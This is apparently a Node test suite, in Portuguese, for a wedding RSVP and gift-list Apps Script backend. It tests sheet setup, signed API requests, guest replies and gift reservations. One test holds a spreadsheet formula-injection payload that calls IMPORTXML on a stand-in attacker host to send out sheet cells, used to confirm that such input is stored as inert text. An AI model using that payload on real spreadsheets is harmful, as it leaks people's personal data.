// Testes do Apps Script (apps-script/*.gs) num simulador do Google, com planilhas de teste em memória.
const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { carregarAppsScript } = require('./apps-script/simulador');
const { planilhaConvidados, planilhaPresentes, ID_PRESENTES, SEGREDO } = require('./apps-script/dados');
const { montarEnvelope } = require('../lib/planilha/cliente');

function ambiente({ preparar = true, propriedades } = {}) {
  const conv = planilhaConvidados();
  const pres = planilhaPresentes();
  const env = carregarAppsScript({
    convidados: conv, presentes: pres,
    propriedades: propriedades || { SEGREDO_API: SEGREDO, ID_PLANILHA_PRESENTES: ID_PRESENTES }
  });
  const relatorio = preparar ? env.ctx.prepararTudo_() : [];
  return Object.assign(env, { conv, pres, relatorio });
}

function chamar(env, acao, dados, { segredo = SEGREDO, ts } = {}) {
  const out = env.ctx.doPost({ postData: { contents: montarEnvelope(acao, dados, segredo, ts) } });
  return JSON.parse(out.getContent());
}
const dadosDe = r => { assert.equal(r.ok, true, JSON.stringify(r)); return r.dados; };
const aba = (planilha, nome) => planilha.getSheetByName(nome);
/** Cabeçalho → { texto: nºcoluna } da linha indicada. */
const colunas = (a, linha) => Object.fromEntries(a.linha(linha).map((t, i) => [t, i + 1]).filter(([t]) => t));
let seq = 0;
const pedido = () => 'pedido-de-teste-' + String(++seq).padStart(6, '0');

describe('Preparar planilhas', () => {
  test('convidados: tira o resumo de baixo da lista, cria colunas, IDs, abas Respostas e Resumo', () => {
    const env = ambiente();
    const lista = aba(env.conv, 'Lista de Convidados');
    const cab = colunas(lista, 4);
    for (const c of ['Outros nomes', 'Convite', 'Respondido em', 'Origem', 'ID']) assert.ok(cab[c], 'coluna ' + c);
    assert.equal(lista.getLastRow(), 12, 'o bloco "Resumo" embaixo da lista foi removido');
    const ids = [5, 6, 7, 8, 9, 10, 11, 12].map(r => lista.ver(r, cab.ID).v);
    assert.deepEqual(ids, ['C0001', 'C0002', 'C0003', 'C0004', 'C0005', 'C0006', 'C0007', 'C0008']);
    assert.ok(aba(env.conv, 'Respostas'));
    const resumo = aba(env.conv, 'Resumo');
    const criancas = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20].map(r => resumo.linha(r)).find(l => l[0] === 'Crianças');
    assert.deepEqual(criancas.slice(1, 3), [8, 12], 'números de crianças digitados à mão foram preservados');
    assert.match(resumo.ver(4, 2).f, /^=COUNTIF\('Lista de Convidados'!F5:F,"Confirmado"\)$/);
  });

  test('presentes: remove a linha TOTAL, cria colunas, IDs, aba Escolhas e Status calculado', () => {
    const env = ambiente();
    const lista = aba(env.pres, 'Lista de Presentes');
    const cab = colunas(lista, 5);
    assert.ok(cab['Mostrar no site'] && cab.ID);
    assert.ok(!lista.linha(12).includes('TOTAL DA LISTA') && !lista.linha(11).includes('TOTAL DA LISTA'));
    assert.deepEqual([6, 7, 8, 9, 10].map(r => lista.ver(r, cab.ID).v), ['P0001', 'P0002', 'P0003', 'P0004', 'P0005']);
    assert.equal(lista.ver(6, cab['Mostrar no site']).v, 'Sim');
    const status = lista.ver(5, 9);
    assert.match(status.f, /^=ARRAYFORMULA\(IF\(ROW\(/);
    assert.match(status.f, /"Cotas preenchidas"/);
    assert.equal(lista.ver(6, 9).v, '', 'valores antigos de Status apagados (a fórmula preenche)');
    assert.deepEqual(aba(env.pres, 'Escolhas').linha(1).slice(0, 3), ['Data', 'Pedido', 'ID presente']);
    const resumo = aba(env.pres, 'Resumo');
    assert.equal(resumo.ver(3, 6).v, 'Escolhido (R$)');
    assert.match(resumo.ver(4, 4).f, /^=SUMIFS\(Escolhas!/);
  });

  test('pode rodar de novo sem duplicar nada', () => {
    const env = ambiente();
    const lista = aba(env.conv, 'Lista de Convidados');
    const antes = lista.linha(4).join('|');
    env.ctx.prepararTudo_();
    assert.equal(lista.linha(4).join('|'), antes);
    assert.equal(lista.ver(12, colunas(lista, 4).ID).v, 'C0008');
    assert.equal(aba(env.pres, 'Lista de Presentes').linha(5).filter(t => t === 'ID').length, 1);
  });
});

describe('Segurança da API', () => {
  test('sem assinatura, assinatura errada ou pedido velho → não autorizado', () => {
    const env = ambiente();
    const semEnvelope = JSON.parse(env.ctx.doPost({ postData: { contents: '{"acao":"convidados"}' } }).getContent());
    assert.equal(semEnvelope.erro, 'nao_autorizado');
    assert.equal(chamar(env, 'convidados', {}, { segredo: 'outro-segredo-qualquer-com-mais-de-32-caracteres' }).erro, 'nao_autorizado');
    assert.equal(chamar(env, 'convidados', {}, { ts: Date.now() - 6 * 60 * 1000 }).erro, 'nao_autorizado');
    assert.equal(JSON.parse(env.ctx.doPost({}).getContent()).erro, 'nao_autorizado');
  });

  test('assinatura certa → ok; ação desconhecida → erro', () => {
    const env = ambiente();
    assert.equal(chamar(env, 'saude').ok, true);
    assert.equal(chamar(env, 'apagarTudo').erro, 'acao_invalida');
  });

  test('sem segredo configurado → recusa tudo', () => {
    const env = ambiente({ preparar: false, propriedades: { ID_PLANILHA_PRESENTES: ID_PRESENTES } });
    assert.equal(chamar(env, 'saude').erro, 'nao_configurado');
  });

  test('saúde não devolve dados pessoais', () => {
    const env = ambiente();
    const d = dadosDe(chamar(env, 'saude'));
    assert.deepEqual(Object.keys(d).sort(), ['convidados', 'presentes', 'versao']);
    assert.equal(d.convidados, 8);
  });
});

describe('Convidados e respostas', () => {
  test('lista com ID, apelidos separados e status', () => {
    const env = ambiente();
    const lista = aba(env.conv, 'Lista de Convidados');
    lista.definir(5, colunas(lista, 4)['Outros nomes'], 'Aninha; Ana Silva');
    const d = dadosDe(chamar(env, 'convidados'));
    assert.equal(d.length, 8);
    assert.deepEqual(d[0].outros, ['Aninha', 'Ana Silva']);
    assert.equal(d.find(p => p.nome === 'Elisa Demo').status, 'nao');
    assert.equal(d[0].status, null);
    assert.notEqual(d[0].convite, d[1].convite, 'sem "Convite", cada um confirma sozinho');
  });

  test('pessoa nova sem ID ganha um; linha copiada (ID repetido) ganha outro', () => {
    const env = ambiente();
    const lista = aba(env.conv, 'Lista de Convidados');
    const cab = colunas(lista, 4);
    lista.definir(13, cab.Nome, 'Gabriela Nova');
    lista.definir(14, cab.Nome, 'Heitor Copiado');
    lista.definir(14, cab.ID, 'C0002');
    const d = dadosDe(chamar(env, 'convidados'));
    assert.equal(d.find(p => p.nome === 'Gabriela Nova').id, 'C0009');
    assert.equal(d.find(p => p.nome === 'Heitor Copiado').id, 'C0010');
    assert.equal(d.find(p => p.nome === 'Bruno Exemplo').id, 'C0002');
  });

  test('responder grava Presença, data e origem, e guarda o histórico', () => {
    const env = ambiente();
    const r = dadosDe(chamar(env, 'responder', { pedido: pedido(), itens: [{ id: 'C0001', status: 'vai' }] }));
    assert.deepEqual(r.itens, [{ id: 'C0001', nome: 'Ana Teste Silva', status: 'vai' }]);
    const lista = aba(env.conv, 'Lista de Convidados');
    const cab = colunas(lista, 4);
    assert.equal(lista.ver(5, cab['Presença']).v, 'Confirmado');
    assert.equal(lista.ver(5, cab.Origem).v, 'Site');
    assert.equal(Object.prototype.toString.call(lista.ver(5, cab['Respondido em']).v), '[object Date]');
    const hist = aba(env.conv, 'Respostas');
    assert.deepEqual(hist.linha(2).slice(2, 5), ['C0001', 'Ana Teste Silva', 'Confirmado']);
    // alterar
    dadosDe(chamar(env, 'responder', { itens: [{ id: 'C0001', status: 'nao' }] }));
    assert.equal(lista.ver(5, cab['Presença']).v, 'Não vai');
    assert.equal(hist.getLastRow(), 3, 'as duas respostas ficam no histórico');
  });

  test('convite em grupo: precisa responder por todos do grupo', () => {
    const env = ambiente();
    const lista = aba(env.conv, 'Lista de Convidados');
    const cab = colunas(lista, 4);
    lista.definir(7, cab.Convite, 'Família Modelo');
    lista.definir(9, cab.Convite, 'familia modelo'); // maiúscula/acento diferentes = mesmo convite
    const d = dadosDe(chamar(env, 'convidados'));
    assert.equal(d.find(p => p.id === 'C0003').convite, d.find(p => p.id === 'C0005').convite);
    assert.equal(chamar(env, 'responder', { itens: [{ id: 'C0003', status: 'vai' }] }).erro, 'itens_invalidos');
    dadosDe(chamar(env, 'responder', { itens: [{ id: 'C0003', status: 'vai' }, { id: 'C0005', status: 'nao' }] }));
    assert.equal(lista.ver(9, cab['Presença']).v, 'Não vai');
  });

  test('itens inválidos são recusados sem gravar nada', () => {
    const env = ambiente();
    for (const itens of [[], 'x', [null], [{ id: 'C9999', status: 'vai' }], [{ id: 'C0001', status: 'talvez' }],
      [{ id: 'C0001', status: 'vai' }, { id: 'C0001', status: 'nao' }], [{ id: 'C0001', status: 'vai' }, { id: 'C0002', status: 'vai' }]]) {
      assert.equal(chamar(env, 'responder', { itens }).erro, 'itens_invalidos', JSON.stringify(itens));
    }
    assert.equal(aba(env.conv, 'Respostas').getLastRow(), 1);
  });

  test('planilha ocupada → "ocupado", sem gravar', () => {
    const env = ambiente();
    env.trava.livre = false;
    assert.equal(chamar(env, 'responder', { itens: [{ id: 'C0001', status: 'vai' }] }).erro, 'ocupado');
    env.trava.livre = true;
    assert.equal(aba(env.conv, 'Respostas').getLastRow(), 1);
  });

  test('coluna renomeada → erro de estrutura, nada gravado e um único e-mail de alerta', () => {
    const env = ambiente();
    const lista = aba(env.conv, 'Lista de Convidados');
    lista.definir(4, colunas(lista, 4)['Presença'], 'Presenca confirmada?');
    const r = chamar(env, 'responder', { itens: [{ id: 'C0001', status: 'vai' }] });
    assert.equal(r.erro, 'estrutura_planilha');
    assert.match(r.mensagem, /"Presença"/);
    chamar(env, 'convidados');
    assert.equal(env.emails.length, 1, 'no máximo um alerta por hora');
    assert.equal(env.emails[0].para, 'dono@exemplo.com');
  });
});

describe('Presentes e escolhas', () => {
  test('lista: valores em centavos, link só https, observação "-" vazia, presente com erro fica de fora', () => {
    const env = ambiente();
    const d = dadosDe(chamar(env, 'presentes'));
    assert.equal(d.problemas, 1);
    const [panelas, vasilhas, cafe, geladeira] = d.presentes;
    assert.deepEqual([panelas.id, panelas.tipo, panelas.valorCentavos, panelas.qtd, panelas.escolhidos], ['P0001', 'item', 60000, 1, 0]);
    assert.equal(panelas.link, 'https://www.google.com/search?tbm=shop&q=panelas');
    assert.equal(panelas.observacao, 'Aço inox ou cerâmica');
    assert.equal(vasilhas.observacao, '');
    assert.equal(cafe.tipo, 'cota');
    assert.equal(geladeira.link, '', 'javascript: nunca vira link');
    assert.equal(d.presentes.length, 4);
    assert.match(env.emails[0].corpo, /Presente sem tipo/);
  });

  test('comprar reserva uma unidade e devolve o link da loja', () => {
    const env = ambiente();
    const r = dadosDe(chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0002', modo: 'comprar', convidadoId: 'C0001', nomeDigitado: 'Ana Teste', recado: 'Felicidades!' }));
    assert.deepEqual(r, { presenteId: 'P0002', restantes: 1, link: 'https://www.google.com/search?tbm=shop&q=vasilhas', repetido: false });
    const esc = aba(env.pres, 'Escolhas');
    const cab = colunas(esc, 1);
    assert.deepEqual([esc.ver(2, cab['ID presente']).v, esc.ver(2, cab.Como).v, esc.ver(2, cab.Convidado).v, esc.ver(2, cab.Recado).v, esc.ver(2, cab.Conferido).v],
      ['P0002', 'Comprar', 'Ana Teste Silva', 'Felicidades!', false]);
    assert.equal(esc.ver(2, cab['Valor (R$)']).v, 85);
    assert.equal(dadosDe(chamar(env, 'presentes')).presentes.find(p => p.id === 'P0002').escolhidos, 1);
  });

  test('esgota na quantidade; cancelar na planilha libera', () => {
    const env = ambiente();
    const esc = { presenteId: 'P0001', modo: 'comprar', convidadoId: 'C0002' };
    dadosDe(chamar(env, 'escolher', Object.assign({ pedido: pedido() }, esc)));
    assert.equal(chamar(env, 'escolher', Object.assign({ pedido: pedido() }, esc)).erro, 'esgotado');
    const aEsc = aba(env.pres, 'Escolhas');
    aEsc.definir(2, colunas(aEsc, 1).Cancelado, true);
    dadosDe(chamar(env, 'escolher', Object.assign({ pedido: pedido() }, esc)));
  });

  test('aviso de Pix também ocupa a unidade de um Item', () => {
    const env = ambiente();
    dadosDe(chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0001', modo: 'pix', convidadoId: 'C0001' }));
    assert.equal(chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0001', modo: 'comprar', convidadoId: 'C0002' }).erro, 'esgotado');
  });

  test('Cota Pix: não aceita "comprar" e fecha ao preencher as cotas', () => {
    const env = ambiente();
    assert.equal(chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0003', modo: 'comprar', convidadoId: 'C0001' }).erro, 'so_pix');
    for (let i = 0; i < 3; i++) {
      const r = dadosDe(chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0003', modo: 'pix', convidadoId: 'C0001' }));
      assert.equal(r.restantes, 2 - i);
      assert.equal(r.link, '');
    }
    const r = chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0003', modo: 'pix', convidadoId: 'C0002' });
    assert.equal(r.erro, 'esgotado');
    assert.match(r.mensagem, /cotas/);
  });

  test('mesmo pedido duas vezes (clique duplo, nova tentativa) grava uma vez só', () => {
    const env = ambiente();
    const dados = { pedido: pedido(), presenteId: 'P0002', modo: 'comprar', convidadoId: 'C0001' };
    dadosDe(chamar(env, 'escolher', dados));
    const r = dadosDe(chamar(env, 'escolher', dados));
    assert.equal(r.repetido, true);
    assert.equal(r.link, 'https://www.google.com/search?tbm=shop&q=vasilhas');
    assert.equal(aba(env.pres, 'Escolhas').getLastRow(), 2);
  });

  test('recado com fórmula é gravado como texto (não executa na planilha)', () => {
    const env = ambiente();
    const ataque = '=IMPORTXML("https://atacante.exemplo/?d="&A1:A300,"//a")';
    dadosDe(chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0002', modo: 'pix', convidadoId: 'C0001', recado: ataque, nomeDigitado: '+5511999999999' }));
    const esc = aba(env.pres, 'Escolhas');
    const cab = colunas(esc, 1);
    const recado = esc.ver(2, cab.Recado), nome = esc.ver(2, cab['Nome digitado']);
    assert.equal(recado.f, undefined, 'não virou fórmula');
    assert.equal(recado.v, ataque);
    assert.equal(nome.f, undefined);
  });

  test('presente oculto, inexistente, convidado inexistente e pedido inválido são recusados', () => {
    const env = ambiente();
    const lista = aba(env.pres, 'Lista de Presentes');
    lista.definir(6, colunas(lista, 5)['Mostrar no site'], 'Não');
    const base = { modo: 'comprar', convidadoId: 'C0001' };
    assert.equal(chamar(env, 'escolher', Object.assign({ pedido: pedido(), presenteId: 'P0001' }, base)).erro, 'presente_nao_encontrado');
    assert.equal(chamar(env, 'escolher', Object.assign({ pedido: pedido(), presenteId: 'P9999' }, base)).erro, 'presente_nao_encontrado');
    assert.equal(chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0002', modo: 'comprar', convidadoId: 'C9999' }).erro, 'convidado_nao_encontrado');
    assert.equal(chamar(env, 'escolher', { pedido: 'curto', presenteId: 'P0002', modo: 'comprar', convidadoId: 'C0001' }).erro, 'pedido_invalido');
    assert.equal(chamar(env, 'escolher', { pedido: pedido(), presenteId: 'P0002', modo: 'cartao', convidadoId: 'C0001' }).erro, 'modo_invalido');
    assert.equal(aba(env.pres, 'Escolhas').getLastRow(), 1);
  });
});

describe('Conferir nomes', () => {
  test('aponta uma palavra só, "namorado de…", parênteses e nomes repetidos', () => {
    const env = ambiente();
    const lista = aba(env.conv, 'Lista de Convidados');
    const cab = colunas(lista, 4);
    lista.definir(13, cab.Nome, 'Bruno Exemplo');
    lista.definir(12, cab['Outros nomes'], 'Ana Teste Silva');
    const p = env.ctx.conferirNomes_().join('\n');
    assert.match(p, /"Zeca": só uma palavra/);
    assert.match(p, /"Namorado de Carla": não parece o nome/);
    assert.match(p, /"Diego Ficticio \(pai\)": tem parênteses/);
    assert.match(p, /Linhas 6, 13: o nome "bruno exemplo"/);
    assert.match(p, /Linhas 5, 12: o nome "ana teste silva"/, 'apelido igual ao nome de outra pessoa também conta');
    assert.doesNotMatch(p, /Fábio Amostra/);
  });
});
